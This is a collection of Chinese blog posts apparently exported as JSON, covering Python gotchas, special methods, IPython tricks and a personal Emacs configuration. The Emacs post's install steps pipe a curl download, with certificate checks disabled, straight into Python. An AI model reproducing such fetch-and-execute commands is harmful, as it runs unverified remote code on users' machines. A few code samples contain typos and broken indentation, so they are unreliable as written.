datetime也有布尔值\n\n这是一个[坑](http://lwn.net/SubscriberLink/590299/bf73fe823974acea/)\n\n```python\nIn [34]: import datetime\n\nIn [35]: print('\"datetime.time(0,0,0)\" (Midnight) ->', bool(datetime.time(0,0,0)))\n('\"datetime.time(0,0,0)\" (Midnight) ->', False)\n\nIn [36]: print('\"datetime.time(1,0,0)\" (1 am) ->', bool(datetime.time(1,0,0)))\n('\"datetime.time(1,0,0)\" (1 am) ->', True)\n```\n\n#### '==' 和 is 的区别\n我的理解是\"is\"是判断2个对象的身份, ==是判断2个对象的值\n\n```python\nIn [37]: a = 1\n\nIn [38]: b = 1\n\nIn [39]: print('a is b', bool(a is b))\n('a is b', True)\n\nIn [40]: c = 999\n\nIn [41]: d = 999\n\nIn [42]: print('c is d', bool(c is d))\n('c is d', False) # 原因是python的内存管理,缓存了-5 - 256的对象\n\nIn [43]: print('256 is 257-1', 256 is 257-1)\n('256 is 257-1', True)\n\nIn [44]: print('257 is 258-1', 257 is 258 - 1)\n('257 is 258-1', False)\n\nIn [45]: print('-5 is -6+1', -5 is -6+1)\n('-5 is -6+1', True)\n\nIn [46]: print('-7 is -6-1', -7 is -6-1)\n('-7 is -6-1', False)\nIn [47]: a = 'hello world!'\n\nIn [48]: b = 'hello world!'\n\nIn [49]: print('a is b,', a is b)\n('a is b,', False) # 很明显 他们没有被缓存,这是2个字段串的对象\n\nIn [50]: print('a == b,', a == b)\n('a == b,', True) # 但他们的值相同\n# But, 有个特例\nIn [51]: a = float('nan')\n\nIn [52]: print('a is a,', a is a)\n('a is a,', True)\n\nIn [53]: print('a == a,', a == a)\n('a == a,', False) # 亮瞎我眼睛了~\n\n```\n\n#### 浅拷贝和深拷贝\n\n我们在实际开发中都可以向对某列表的对象做修改,但是可能不希望改动原来的列表. **浅拷贝只拷贝父对象，深拷贝还会拷贝对象的内部的子对象**\n\n```python\nIn [65]: list1 = [1, 2]\n\nIn [66]: list2 = list1 # 就是个引用, 你操作list2,其实list1的结果也会变\n\nIn [67]: list3 = list1[:]\n\nIn [69]: import copy\n\nIn [70]: list4 = copy.copy(list1) # 他和list3一样 都是浅拷贝\n\nIn [71]: id(list1), id(list2), id(list3), id(list4)\nOut[71]: (4480620232, 4480620232, 4479667880, 4494894720)\n\nIn [72]: list2[0] = 3\n\nIn [73]: print('list1:', list1)\n('list1:', [3, 2])\n\nIn [74]: list3[0] = 4\n\nIn [75]: list4[1] = 4\n\nIn [76]: print('list1:', list1)\n('list1:', [3, 2]) # 对list3和list4操作都没有对list1有影响\n\n# 再看看深拷贝和浅拷贝的区别\n\nIn [88]: from copy import copy, deepcopy\n\nIn [89]: list1 = [[1], [2]]\n\nIn [90]: list2 = copy(list1) # 还是浅拷贝\n\nIn [91]: list3 = deepcopy(list1) # 深拷贝\n\nIn [92]: id(list1), id(list2), id(list3)\nOut[92]: (4494896592, 4495349160, 4494896088)\n\nIn [93]: list2[0][0] = 3\n\nIn [94]: print('list1:', list1)\n('list1:', [[3], [2]]) # 看到了吧 假如你操作其子对象 还是和引用一样 影响了源\n\nIn [95]: list3[0][0] = 5\n\nIn [96]: print('list1:', list1)\n('list1:', [[3], [2]]) # 深拷贝就不会影响\n```\n\n#### bool其实是int的子类\n\n这篇[bool-is-int](http://www.peterbe.com/plog/bool-is-int)很有趣:\n\n```python\nIn [97]: isinstance(True, int)\nOut[97]: True\n\nIn [98]: True + True\nOut[98]: 2\n\nIn [99]: 3 * True + True\nOut[99]: 4\n\nIn [100]: 3 * True - False\nOut[100]: 3\n\nIn [104]: True << 10\nOut[104]: 1024 \n```\n\n#### 元组是不是真的不可变?\n\n```python\nIn [111]: tup = ([],)\n\nIn [112]: tup[0] += [1]\n---------------------------------------------------------------------------\nTypeError                                 Traceback (most recent call last)\n<ipython-input-112-d4f292cf35de> in <module>()\n----> 1 tup[0] += [1]\n\nTypeError: 'tuple' object does not support item assignment\n\nIn [113]: tup\nOut[113]: ([1],) # 我靠 又是亮瞎我眼睛,明明抛了异常 还能修改?\n\nIn [114]: tup = ([],)\n\nIn [115]: tup[0].extend([1])\n\nIn [116]: tup[0]\nOut[116]: [1] # 好吧,我有点看明白了, 虽然我不能直接操作元组，但是不能阻止我操作元组中可变的子对象(list)\n```\n\n这里有个不错的解释[Python's += Is Weird, Part II ](http://emptysqua.re/blog/python-increment-is-weird-part-ii/):\n\n```python\nIn [117]: my_tup = (1,)\n\nIn [118]: my_tup += (4,)\n\nIn [119]: my_tup = my_tup + (5,)\n\nIn [120]: my_tup\nOut[120]: (1, 4, 5) # ? 嗯 不是不能操作元组嘛?\n\nIn [121]: my_tup = (1,)\n\nIn [122]: print(id(my_tup))\n4481317904\n\nIn [123]: my_tup += (4,)\n\nIn [124]: print(id(my_tup))\n4480606864 # 操作的不是原来的元组 所以可以\n\nIn [125]: my_tup = my_tup + (5,)\n\nIn [126]: print(id(my_tup))\n4474234912\n\n```\n\n#### python没有私有方法/变量? 但是可以有\"伪\"的\n\n```python\nIn [127]: class my_class(object^E):\n   .....:     def public_method(self):\n   .....:         print('Hello public world!')\n   .....:     def __private_method(self): # 私有以双下划线开头\n   .....:         print('Hello private world!')\n   .....:     def call_private_method_in_class(self):\n   .....:         self.__private_method()\n   \nIn [132]: my_instance = my_class()\n\nIn [133]: my_instance.public_method()\nHello public world! # 普通方法\n\nIn [134]: my_instance._my_class__private_method()\nHello private world! # 私有的可以加\"_ + 类名字 + 私有方法名字”\n\nIn [135]: my_instance.call_private_method_in_class()\nHello private world! # 还可以通过类提供的公有接口内部访问\n\nIn [136]: my_instance._my_class__private_variable\nOut[136]: 1\n\n```\n\n#### 异常处理加else\n\n```python\nIn [150]: try:\n   .....:     print('third element:', a_list[2])\n   .....: except IndexError:\n   .....:     print('raised IndexError')\n   .....: else:\n   .....:     print('no error in try-block') # 只有在try里面没有异常的时候才会执行else里面的表达式\n   .....:     \nraised IndexError # 抛异常了 没完全完成\nIn [153]: i = 0\n\nIn [154]: while i < 2:\n   .....:     print(i)\n   .....:     i += 1\n   .....: else:\n   .....:     print('in else')\n   .....:     \n0\n1\nin else # while也支持哦~\nIn [155]: i = 0\n\nIn [156]: while i < 2:\n   .....:         print(i)\n   .....:         i += 1\n   .....:         break\n   .....: else:\n   .....:         print('completed while-loop')\n   .....:     \n0 # 被break了 没有完全执行完 就不执行else里面的了\nIn [158]: for i in range(2):\n   .....:         print(i)\n   .....: else:\n   .....:         print('completed for-loop')\n   .....:     \n0\n1\ncompleted for-loop\n\nIn [159]: for i in range(2):\n   .....:         print(i)\n   .....:         break\n   .....: else:\n   .....:         print('completed for-loop')\n   .....:     \n0 # 也是因为break了\n```",
    "date": {
      "year": "2014",
      "month": "May",
      "day": "08"
    }
  },
  {
    "id": 295,
    "title": "python的魔法二:开发的'坑'",
    "category": "python",
    "tags": [
      "python"
    ],
    "url": "/archives/pythonmo-fa-er/",
    "content": "#### 有了第一篇[python的魔法(-)之基础知识](http://www.dongwm.com/archives/pythonde-mo-fa/), 我们再来说说python开发中的坑\n\n\n#### 不要使用可变对象作为函数默认值\n\n```python\nIn [1]: def append_to_list(value, def_list=[]):\n   ...:         def_list.append(value)\n   ...:         return def_list\n   ...: \n\nIn [2]: my_list = append_to_list(1)\n\nIn [3]: my_list\nOut[3]: [1]\n\nIn [4]: my_other_list = append_to_list(2)\n\nIn [5]: my_other_list\nOut[5]: [1, 2] # 看到了吧，其实我们本来只想生成[2] 但是却把第一次运行的效果页带了进来\n\nIn [6]: import time\n\nIn [7]: def report_arg(my_default=time.time()):\n   ...:         print(my_default)\n   ...:     \n\nIn [8]: report_arg() # 第一次执行\n1399562371.32\n\nIn [9]: time.sleep(2) # 隔了2秒\n\nIn [10]: report_arg()\n1399562371.32 # 时间竟然没有变\n\n```\n\n这2个例子说明了什么? 字典,集合,列表等等对象是不适合作为函数默认值的. 因为这个默认值实在函数建立的时候就生成了, 每次调用都是用了这个对象的\"缓存\". 我在上段时间的分享[python高级编程](http://dongweiming.github.io/Expert-Python/)也说到了这个问题,这个是实际开发遇到的问题，好好检查你学过的代码, 也许只是问题没有暴露\n\n可以这样改:\n\n```python\ndef append_to_list(element, to=None):\n    if to is None:\n        to = []\n    to.append(element)\n    return to\n```\n\n#### 生成器不保留迭代过后的结果\n\n```python\nIn [12]: gen = (i for i in range(5))\n\nIn [13]: 2 in gen\nOut[13]: True\n\nIn [14]: 3 in gen\nOut[14]: True\n\nIn [15]: 1 in gen\nOut[15]: False # 1为什么不在gen里面了? 因为调用1->2,这个时候1已经不在迭代器里面了,被按需生成过了\n\nIn [20]: gen = (i for i in range(5))\n\nIn [21]: a_list = list(gen) # 可以转化成列表，当然a_tuple = tuple(gen) 也可以\n\nIn [22]: 2 in a_list\nOut[22]: True\n\nIn [23]: 3 in a_list\nOut[23]: True\n\nIn [24]: 1 in a_list # 就算循环过,值还在\nOut[24]: True\n```\n\n#### lambda在闭包中会保存局部变量\n\n```python\nIn [29]: my_list = [lambda: i for i in range(5)]\n\nIn [30]: for l in my_list:\n   ....:         print(l())\n   ....:     \n4\n4\n4\n4\n4\n```\n\n这个问题还是上面说的[python高级编程](http://dongweiming.github.io/Expert-Python/)中说过具体原因. 其实就是当我赋值给my_list的时候,lambda表达式就执行了i会循环,直到 i =4,i会保留\n\n但是可以用生成器\n\n```python\nIn [31]: my_gen = (lambda: n for n in range(5))\n\nIn [32]: for l in my_gen:\n   ....:         print(l())\n   ....:     \n0\n1\n2\n3\n4\n```\n\n也可以坚持用list：\n\n```python\nIn [33]: my_list = [lambda x=i: x for i in range(5)] # 看我给每个lambda表达式赋了默认值\n\nIn [34]: for l in my_list:\n   ....:         print(l())\n   ....:     \n0\n1\n2\n3\n4\n```\n\n有点不好懂是吧,在看看python的另外一个魔法:\n\n```python\nIn [35]: def groupby(items, size):\n   ....:     return zip(*[iter(items)]*size)\n   ....: \n\nIn [36]: groupby(range(9), 3)\nOut[36]: [(0, 1, 2), (3, 4, 5), (6, 7, 8)]\n```\n\n一个分组的函数,看起来很不好懂,对吧? 我们来解析下这里\n\n```python\nIn [39]: [iter(items)]*3\nOut[39]: \n[<listiterator at 0x10e155fd0>,\n <listiterator at 0x10e155fd0>,\n <listiterator at 0x10e155fd0>] # 看到了吧, 其实就是把items变成可迭代的, 重复三回（同一个对象哦）, 但是别忘了,每次都.next(), 所以起到了分组的作用\n In [40]: [lambda x=i: x for i in range(5)]\nOut[40]: \n[<function __main__.<lambda>>,\n <function __main__.<lambda>>,\n <function __main__.<lambda>>,\n <function __main__.<lambda>>,\n <function __main__.<lambda>>] # 看懂了吗?\n```\n\n#### 在循环中修改列表项\n\n```python\nIn [44]: a = [1, 2, 3, 4, 5]\n\nIn [45]: for i in a:\n   ....:     if not i % 2:\n   ....:         a.remove(i)\n   ....:         \n\nIn [46]: a\nOut[46]: [1, 3, 5] # 没有问题\n\nIn [50]: b = [2, 4, 5, 6]\n\nIn [51]: for i in b:\n   ....:      if not i % 2:\n   ....:          b.remove(i)\n   ....:         \n\nIn [52]: b\nOut[52]: [4, 5] # 本来我想要的结果应该是去除偶数的列表\n```\n\n思考一下,为什么 -- 是因为你对列表的remove,影响了它的index\n\n```python\nIn [53]: b = [2, 4, 5, 6]\n\nIn [54]: for index, item in enumerate(b):\n   ....:     print(index, item)\n   ....:     if not item % 2:\n   ....:         b.remove(item)\n   ....:         \n(0, 2) # 这里没有问题 2被删除了\n(1, 5) # 因为2被删除目前的列表是[4, 5, 6], 所以索引list[1]直接去找5, 忽略了4\n(2, 6)\n```\n\n#### IndexError - 列表取值超出了他的索引数\n\n```python\nIn [55]: my_list = [1, 2, 3, 4, 5]\n\nIn [56]: my_list[5] # 根本没有这个元素\n---------------------------------------------------------------------------\nIndexError                                Traceback (most recent call last)\n<ipython-input-56-037d00de8360> in <module>()\n----> 1 my_list[5]\n\nIndexError: list index out of range # 抛异常了\n\nIn [57]: my_list[5:] # 但是可以这样， 一定要注意, 用好了是trick,用错了就是坑啊\nOut[57]: []\n```\n\n#### 重用全局变量\n\n```python\nIn [58]: def my_func():\n   ....:         print(var) # 我可以先调用一个未定义的变量\n   ....:     \n\nIn [59]: var = 'global' # 后赋值\n\nIn [60]: my_func() # 反正只要调用函数时候变量被定义了就可以了\nglobal\n\nIn [61]: def my_func():\n   ....:     var = 'locally changed'\n   ....:     \n\nIn [62]: var = 'global'\n\nIn [63]: my_func()\n\nIn [64]: print(var)\nglobal # 局部变量没有影响到全局变量\n\nIn [65]: def my_func():\n   ....:         print(var) # 虽然你全局设置这个变量, 但是局部变量有同名的, python以为你忘了定义本地变量了\n   ....:         var = 'locally changed'\n   ....:         \n\nIn [66]: var = 'global'\n\nIn [67]: my_func()\n---------------------------------------------------------------------------\nUnboundLocalError                         Traceback (most recent call last)\n<ipython-input-67-d82eda95de40> in <module>()\n----> 1 my_func()\n\n<ipython-input-65-0ad11d690936> in my_func()\n      1 def my_func():\n----> 2         print(var)\n      3         var = 'locally changed'\n      4 \n\nUnboundLocalError: local variable 'var' referenced before assignment\n\nIn [68]: def my_func():\n   ....:         global var # 这个时候得加全局了\n   ....:         print(var) # 这样就能正常使用\n   ....:         var = 'locally changed' \n   ....:     \n\nIn [69]: var = 'global'\n\nIn [70]: \n\nIn [70]: my_func()\nglobal\n\nIn [71]: print(var)\nlocally changed # 但是使用了global就改变了全局变量\n```\n\n#### 拷贝可变对象\n\n```python\nIn [72]: my_list1 = [[1, 2, 3]] * 2\n\nIn [73]: my_list1\nOut[73]: [[1, 2, 3], [1, 2, 3]]\n\nIn [74]: my_list1[1][0] = 'a' # 我只修改子列表中的一项\n\nIn [75]: my_list1\nOut[75]: [['a', 2, 3], ['a', 2, 3]] # 但是都影响到了\n\nIn [76]: my_list2 = [[1, 2, 3] for i in range(2)] # 用这种循环生成不同对象的方法就不影响了\n\nIn [77]: my_list2[1][0] = 'a'\n\nIn [78]: my_list2\nOut[78]: [[1, 2, 3], ['a', 2, 3]]\n```",
    "date": {
      "year": "2014",
      "month": "May",
      "day": "08"
    }
  },
  {
    "id": 296,
    "title": "一个使用python的web程序员的emacs.d",
    "category": "emacs",
    "tags": [
      "emacs"
    ],
    "url": "/archives/%5B%3F%5D-ge-shi-yong-pythonde-webcheng-xu-yuan-de-emacs-dot-d/",
    "content": "#### 前言\n\n越来越多的人使用emacs作为开发工具. 甚至skype,gmail,豆瓣FM都能通过emacs.\n作为一个产品开发,肯定使用很多插件,设置一些快捷键来提高开发效率.以前一直使用\n[prelude](https://github.com/bbatsov/prelude),很久之后发现有以下问题:\n\n1. 比如开启python语言支持需要在prelude-modules.el里面把python这样的注释去掉\n2. 我不需要支持这么多的语言,也不需要那么多快捷键\n3. aotupair实在太难用了\n4. scss/css模式不好自定义缩进空格数, tab和空格混用. 不好定制\n5. 看过源码后发现,其实很来很简单粗暴的事情弄得有点复杂了\n\n我造了个轮子[.emacs.d](https://github.com/dongweiming/emacs.d),主要针对python和web开发\n\n####Update\n\n2014-09-28, 经过这一个月的继续研究,已经有了很大的改变\n\n#### 项目目录结构\n\n```\n├── Cask ; 我使用[cask](https://github.com/cask/cask)做包管理工具\n├── auto-insert ; 使用auto-insert设置新增elisp/python文件自动添加基于yasnippet的模板\n│   ├── elisp-auto-insert\n│   └── python-auto-insert\n├── custom ; 自定义插件目录,你也可以把你写的程序放进来然后在init.el里面require\n│   ├── flycheck.el ; 定制flycheck,让它在保存python程序时自动执行pep8和flake8,有问题的条目会打开新的buffer打印出来\n│   └── py-autopep8.el ; 我自己实现了autopep8插件,保存时自动根据pep8标准处理文件\n├── functions.el ; 用到的相关函数\n├── helper.el ; 我自己写了个类似`C-h b`的介绍绑定的快捷键的预览表\n├── hs-minor-mode-conf.el ; python函数/类折叠\n├── init.el ; emacs启动的主程序\n├── keys.el ; Key-chord配置,默认被注释了,因为它和我经常大片粘贴代码中代码重复造成很多麻烦\n├── local-settings.el ; 本机的本地配置,比如用户名,单独的快捷键等\n├── misc.el ; 对emacs本身的一些配置\n├── mode-mappings.el ; 模式映射,比如Cask会自动用emacs-lisp-mode\n├── modeline.el ; 我重新定制了modeline，使用了nyan-mode和powerline,一些加颜色的hack\n├── osx.el ; Mac下的一些独立配置,为我的hhkb定制\n├── smartparens-config.el ; 定制了smartparens配置\n├── tmp\n│   └── README.md\n└── xiaoming-theme.el ; 我自己写了一个主题,好吧 我就是`小明`\n```\n\n#### 使用的插件列表\n\n1. f - 处理文件相关的库\n2. s - 处理字符串相关的库\n3. ag - 据说比ack更快的文本搜索工具`the_silver_searcher`的emacs插件\n4. ht - 处理哈希相关的库\n6. anzu - 显示当前匹配文本，预览替换效果和总匹配数的插件\n7. dash - 常用函数集合\n8. helm - 方便查找各种文件内容,buffer切换,emacs命令执行等\n9. jedi - python代码补全，快速需要函数/模块定义的插件\n10. smex - M-x 的命令行补全的功能\n11. direx - 展示目录树\n12. magit - git插件\n13. slime - commonlisp交互模式\n14. ac-js2 - js2-mode支持js函数定义查找\n15. rinari - 依赖,需要安装\n16. diff-hl - 在行首用颜色表示git状态-只支持图形界面的emacs\n17. dired-k - 用带不同颜色的高亮显示文件/目录,大小等信息\n18. bind-key - 本项目绑定快捷键的用法都根据这个包,没有用global-set-key\n19. css-mode - css-mode\n20. js2-mode - js-mode的升级版\n21. web-mode - 前端开发必备, html缩进,支持根据tag/元素/属性/block/dom跳转,语法高亮,支持mako,jinja2等模板\n22. git-blame - git-blame,单独版\n23. key-chord - 可以快速按键达到快捷键的作用\n24. nyan-mode - 一直可爱的小猫\n25. plim-mode - 我写的编辑plim的major-mode\n26. powerline - 提供一个漂亮的状态栏\n27. sass-mode - 编辑sass\n28. scss-mode - 编辑scss\n29. sublimity - 在图形界面的emacs能缩小预览代码-sublime-text有类似的插件\n30. undo-tree - 让undo可视化\n31. yaml-mode - 编辑yaml\n32. yasnippet - 一个神奇的模板系统,定义缩写并通过tab键自动帮你展开(一些自动的\"填空题\"机制)\n33. drag-stuff - 可以将代码块整体拖动\n34. helm-swoop - 项目内关键词查找,并能自动跳到对应文件和对应行\n35. ibuffer-vc - 支持版本空的ibuffer模式\n36. projectile - 管理项目，可快速访问项目里任何文件，支持全项目关键词搜索 \n37. coffee-mode - 编辑coffee\n38. python-mode - 编辑python\n39. smartparens - 自动括号匹配,可以按块删除,tag跳转\n40. use-package - 本项目引用包的方式\n41. crontab-mode - 高亮编辑crontab\n42. golden-ratio - 黄金分割展示当前window\n43. helm-ipython - helm的ipython插件\n44. rainbow-mode - 在代码中通过背景色标示颜色值\n45. ace-jump-mode - 快速让光标位置到你想去的地方\n46. expand-region - 按层次块区域选择\n47. helm-css-scss - helm的css/scss插件\n48. markdown-mode - 编辑markdown\n49. switch-window - 可视化切换窗口\n50. visual-regexp - 可视化正则匹配\n51. gitconfig-mode - 单独的gitconfig-mode\n52. gitignore-mode - 单独的gitignore-mode\n53. helm-descbinds - 让默认的`C-h b`高亮并且按组分开\n54. imenu-anywhere - 类似于etag, 可直接跳到对应的标签\n55. multiple-cursors - 一次编辑多处/行文字\n56. discover-my-major - 告诉你当前mode的一些说明/快捷键设置\n57. virtualenvwrapper - virtualenvwrapper\n58. gitattributes-mode - 独立的gitattributes-mode\n59. rainbow-delimiters - 对内嵌的括号等pair符号加不同颜色  \n60. idle-highlight-mode - 在设置的一段设置时间未操作电脑会自动高亮当前关键词,并且全文高亮相同关键词\n61. exec-path-from-shell - 可以使用$PATH环境变量\n62. find-file-in-repository - 根据git属性在项目里查找文件\n63. emmet-mode - 类似于zencoding，但是能编辑css,使用很少的代码就能构造一个复杂的div/css\n64. browse-kill-ring - 查看最近操作的删除文本,以及恢复后的效果\n\n#### 安装使用\n\n```\ncurl -fsSkL https://raw.github.com/cask/cask/master/go | python\ngit clone https://github.com/dongweiming/emacs.d .emacs.d\ncd .emacs.d\ncask\nsudo pip install jedi pep8 autopep8 flake8\n```\n\n#### 快捷键分布\n\n请参看项目的[README.md](https://github.com/dongweiming/emacs.d/blob/master/README.md)\n",
    "date": {
      "year": "2014",
      "month": "August",
      "day": "12"
    }
  },
  {
    "id": 297,
    "title": "python几个特别的__开头的方法",
    "category": "python",
    "tags": [
      "python"
    ],
    "url": "/archives/pythonji-ge-te-bie-de-kai-tou-de-fang-fa/",
    "content": "#### 前言\n\n[A Guide to Python's Magic Methods](http://www.rafekettler.com/magicmethods.html)python的绝大多数这样的特殊方法都\n在这里面被提到了. 今天我来说3个他没有提到的[\\_\\_dir\\_\\_, \\_\\_slots\\_\\_, \\_\\_weakref\\_\\_], 再强调下他提到的2个[\\_\\_missing\\_\\_, \\_\\_contains\\_\\_]\n\n\n##### \\_\\_dir\\_\\_ -> 看个小例子就知道了\n\n```python\nIn [1]: class T(object):\n   ...:     pass\n   ...:\nIn [2]: t = T()\nIn [3]: t.<Tab>\n啥也没有...\n```\n\n```python\nIn [4]: class T2(object):\n   ...:     def __dir__(self):\n   ...:         return ['a', 'b']\n   ...:\nIn [5]: t = T2()\nIn [6]: t.\nt.a  t.b\nIn [7]: dir(t)\nOut[7]: ['a', 'b']\n```\n\n看出来了把, 不解释, 但是这个\\_\\_dir\\_\\_是相对于类的实例有效果的.\n\n##### \\_\\_slots\\_\\_\n\n这个在我初学python的时候就被模糊了, 原来的理解是它的出现替代了\\_\\_dict\\_\\_，也就是说你只能给\\_\\_slots\\_\\_\n这个变量列表项的属性赋值. 对外的接口减少了,也安全了. 后来看了这篇[Saving 9 GB of RAM with Python’s __slots__](http://tech.oyster.com/save-ram-with-python-slots/).\n好久不做运维了,在生产环境究竟怎么样我无法定论, <python cookbook>也提到了,在对象实例很多的时候他能帮助减少内存, 详见https://www.safaribooksonline.com/library/view/python-cookbook-3rd/9781449357337/ch08s04.html.\n这里来个小实验(在Hacker News也被讨论过https://news.ycombinator.com/item?id=6750187)\n\n代码例子(我对细节做注释):\n\n```python\n# coding=utf-8\nimport sys\nfrom itertools import starmap, product\n\n\nclass SlotTest(object):\n    # __slots__ = ['x', 'y', 'z'] 主要对比去掉这句和包含这句程序内存占用\n\n    def __init__(self, x, y, z):\n            self.x = x\n                    self.y = y\n                            self.z = z\n\n    def __str__(self):\n            return \"{} {} {}\".format(self.x, self.y, self.z)\n\np = product(range(10000), range(20), [4]) # 创建0-1000 & 0-20 & 4 的笛卡尔积\na = list(starmap(SlotTest, p)) # 相当于对每个SlotTest实例化,实例化的格式是p的长度\n\nprint a[0]\nsys.stdin.read(1)\n```\n\n结果对比:\n\n```bash\n$pmap -x `ps -ef|grep test_slot.py|grep -v grep|awk '{print $2}'`|grep total # 未使用__slots__\n  total kB          103496   76480   73728\n$pmap -x `ps -ef|grep test_slot.py|grep -v grep|awk '{print $2}'`|grep total # 使用了__slots__\n  total kB           49960   22888   20136\n```\n\n结果很明显,内存占用减少了很多...\n\n##### \\_\\_weakref\\_\\_ 弱引用\n\n首先先说下[weakref](http://zh.wikipedia.org/wiki/%E5%BC%B1%E5%BC%95%E7%94%A8): 弱引用，与强引用相对，是指不能确保其引用的对象不会被垃圾回收器回收的引用。一个对象若只被弱引用所引用，则被认为是不可访问（或弱可访问）的，并因此可能在任何时刻被回收.\n在Python中,当一个对象的引用数目为0的时候，才会被从内存中回收. 但是被循环引用呢?\n\n```python\nIn [1]: import weakref\n\nIn [2]: import gc\n\nIn [3]: class Obj(object):\n   ...:     def a(self):\n   ...:         return 1\n   ...:\nIn [4]: obj = Obj()\n\nIn [5]: s = obj\n\nIn [6]: gc.collect() # 不可达引用对象的数量\nOut[6]: 3\n\nIn [7]: print s is obj\nTrue\n\nIn [8]: obj = 1 # 最初的被引用的对象改变了.\n\nIn [9]: gc.collect()\nOut[9]: 0\n\nIn [10]: s is None # s还是指向了Obj 引用计数为1\nOut[10]: False\n\nIn [11]: s\nOut[11]: <__main__.Obj at 0x2b36510>\n\n----华丽的分割一下\n\nIn [12]: obj = Obj()\n\nIn [13]: r = weakref.ref(obj) # 让obj变成那个弱引用\n\nIn [14]: gc.collect()\nOut[14]: 211\n\nIn [15]: r() is obj\nTrue\n\nIn [16]: obj = 1\n\nIn [17]: gc.collect()\nOut[17]: 0\n\nIn [18]: r() is None # 弱引用计数器没有增加，所以当obj不在引用Obj的时候，Obj对象就被释放了\nOut[18]: True\n```\n\n好吧, 我的总结是弱引用是个好东西, 但是加了\\_\\_slots\\_\\_就不支持弱引用了. 所以需要\\_\\_weakref\\_\\_\n\n```python\nIn [9]: class T3(object):\n   ...:     __slots__ = []\n      ...:\n\nIn [10]: class T4(object):\n   ....:     __slots__ = '__weakref__'  # 这样就支持了weakref\n      ....:\n\nIn [11]:  import weakref\n\nIn [12]: t3 = T3()\n\nIn [13]: t4 = T4()\n\nIn [14]: weakref.ref(t3)\n---------------------------------------------------------------------------\nTypeError                                 Traceback (most recent call last)\n<ipython-input-14-bdb7ab7ac3bc> in <module>()\n----> 1 weakref.ref(t3)\n\nTypeError: cannot create weak reference to 'T3' object\n\nIn [15]: weakref.ref(t4)\nOut[15]: <weakref at 0x2766f70; to 'T4' at 0x2586fd8>\n```\n\n##### \\_\\_contains\\_\\_ 判断某值 in/not in 实例\n\n```python\nIn [1]: class NewList(object):\n   ...:     def __init(self, values):\n   ...:         self.values = values\n   ...:     def __contains__(self, value):\n   ...:         return value in self.values\n   ...:\nIn [2]: l = NewList([1, 2, 3, 4])\n\nIn [3]: 4 in l\nOut[3]: True\n\nIn [4]: 10 in l\nOut[4]: False\n```\n\n##### \\_\\_missing\\_\\_\n\n最初看这个特殊方法是看python标准库的源码的时候(collections#L421):\n\n```python\nclass Counter(dict):\n    ...\n\n    def __missing__(self, key):\n        'The count of elements not in the Counter is zero.'\n        # Needed so that self[missing_item] does not raise KeyError\n        return 0\n```\n\n什么意思呢?\n\n```python\nIn [6]: c = collections.Counter({'a':1})\n\nIn [7]: c['b'] # 没有键的count设置默认值0\nOut[7]: 0\n\n```\n\n很多人可能看过这个(关于defaultdict的ppt)[http://discorporate.us/jek/talks/defaultdict/]. 内容就不说了, 讲的非常好.\n",
    "date": {
      "year": "2014",
      "month": "December",
      "day": "06"
    }
  },
  {
    "id": 298,
    "title": "ipython的一些高级用法(一)",
    "category": "python",
    "tags": [
      "python",
      "ipython"
    ],
    "url": "/archives/ipythonde-%5B%3F%5D-xie-gao-ji-yong-fa/",
    "content": "#### 前言\n\n以前在我的PPT[python高级编程](http://dongweiming.github.io/Expert-Python/)也提到了一些关于ipython的用法. 今天继续由浅入深的看看ipython,\n本文作为读者的你已经知道ipython并且用了一段时间了.\n\n##### %run\n\n这是一个magic命令, 能把你的脚本里面的代码运行, 并且把对应的运行结果存入ipython的环境变量中:\n\n```\n$cat t.py\n# coding=utf-8\nl = range(5)\n\n$ipython\nIn [1]: %run t.py # `%`可加可不加\n\nIn [2]: l # 这个l本来是t.py里面的变量, 这里直接可以使用了\nOut[2]: [0, 1, 2, 3, 4]\n```\n\n##### alias\n\n```python\nIn [3]: %alias largest ls -1sSh | grep %s\nIn [4]: largest to\ntotal 42M\n 20K tokenize.py\n 16K tokenize.pyc\n8.0K story.html\n4.0K autopep8\n4.0K autopep8.bak\n4.0K story_layout.html\n```\n\nPS 别名需要存储的, 否则重启ipython就不存在了:\n\n```\nIn [5]: %store largest\nAlias stored: largest (ls -1sSh | grep %s)\n```\n\n下次进入的时候`%store -r`\n\n##### bookmark - 对目录做别名\n\n```python\nIn [2]: %pwd\nOut[2]: u'/home/vagrant'\n\nIn [3]: %bookmark dongxi ~/shire/dongxi\n\nIn [4]: %cd dongxi\n/home/vagrant/shire/dongxi_code\n\nIn [5]: %pwd\nOut[5]: u'/home/vagrant/shire/dongxi_code'\n```\n\n##### ipcluster - 并行计算\n\n其实ipython提供的方便的并行计算的功能. 先回答ipython做并行计算的特点:\n\n1.\n\n```bash\n$wget http://www.gutenberg.org/files/27287/27287-0.txt\n```\n\n第一个版本是直接的, 大家习惯的用法.\n\n```python\nIn [1]: import re\n\nIn [2]: import io\n\nIn [3]: non_word = re.compile(r'[\\W\\d]+', re.UNICODE)\n\nIn [4]: common_words = {\n   ...: 'the','of','and','in','to','a','is','it','that','which','as','on','by',\n   ...: 'be','this','with','are','from','will','at','you','not','for','no','have',\n   ...: 'i','or','if','his','its','they','but','their','one','all','he','when',\n   ...: 'than','so','these','them','may','see','other','was','has','an','there',\n   ...: 'more','we','footnote', 'who', 'had', 'been',  'she', 'do', 'what',\n   ...: 'her', 'him', 'my', 'me', 'would', 'could', 'said', 'am', 'were', 'very',\n   ...: 'your', 'did', 'not',\n   ...: }\n\nIn [5]: def yield_words(filename):\n   ...:     import io\n   ...:     with io.open(filename, encoding='latin-1') as f:\n   ...:         for line in f:\n   ...:             for word in line.split():\n   ...:                 word = non_word.sub('', word.lower())\n   ...:                 if word and word not in common_words:\n   ...:                     yield word\n   ...:\n\nIn [6]: def word_count(filename):\n   ...:     word_iterator = yield_words(filename)\n   ...:     counts = {}\n   ...:     counts = defaultdict(int)\n   ...:     while True:\n   ...:         try:\n   ...:             word = next(word_iterator)\n   ...:         except StopIteration:\n   ...:             break\n   ...:         else:\n   ...:             counts[word] += 1\n   ...:     return counts\n   ...:\n\nIn [6]: from collections import defaultdict # 脑残了 忘记放进去了..\nIn [7]: %time counts = word_count(filename)\nCPU times: user 88.5 ms, sys: 2.48 ms, total: 91 ms\nWall time: 89.3 ms\n```\n\n现在用ipython来跑一下:\n\n```python\nipcluster start -n 2 # 好吧, 我的Mac是双核的\n```\n\n先讲下ipython 并行计算的用法:\n\n```python\nIn [1]: from IPython.parallel import Client # import之后才能用%px*的magic\n\nIn [2]: rc = Client()\n\nIn [3]: rc.ids # 因为我启动了2个进程\nOut[3]: [0, 1]\n\nIn [4]: %autopx # 如果不自动 每句都需要: `%px xxx`\n%autopx enabled\n\nIn [5]: import os # 